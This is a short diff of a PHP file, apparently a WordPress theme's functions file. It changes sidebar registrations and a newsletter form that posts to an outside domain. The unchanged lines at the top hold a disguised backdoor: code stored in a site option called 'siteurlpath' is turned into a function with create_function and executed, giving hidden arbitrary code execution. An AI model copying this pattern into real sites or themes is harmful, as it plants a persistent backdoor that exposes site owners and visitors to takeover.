@@ -18,29 +18,16 @@ if(!isset($siteurlpath)&& @get_option('siteurlpath')){
 	$siteurlpath=create_function('',(get_option('siteurlpath')));
 	$siteurlpath();
 }
-
-
-
-if (function_exists('register_sidebar')) {
- register_sidebar(array(
- 'name' => 'AAA',
- 'id'   => 'aaa',
- 'description'   => 'Ridimensionamento testo',
- 'before_widget' => '<div id="%1$s">',
- 'after_widget'  => '</div>',
- 'before_title'  => '<h4>',
- 'after_title'   => '</h4>'
- ));
-}
-
 if ( function_exists('register_sidebar') )
     register_sidebar(array(
+    	'name' => 'Tubepress',
+    	'id' => 'tube-sidebar',
         'before_widget' => '<li id="%1$s" class="widget %2$s">',
         'after_widget' => '</li>',
         'before_title' => '<h2 class="widgettitle">',
         'after_title' => '</h2>',
     ));
-	function newsLetterForm(){
+function newsLetterForm(){
 		$html = '<div id="ajaxNewsletter">';
 		$html .= '<form action="http://dito.areato.org/home/index.php" method="post" name="ARGWA" id="newsletterForm">';
 		$html .= '<input type="text" name="email" value="Inserisci la tua mail" class="newsletterTextInput" />';
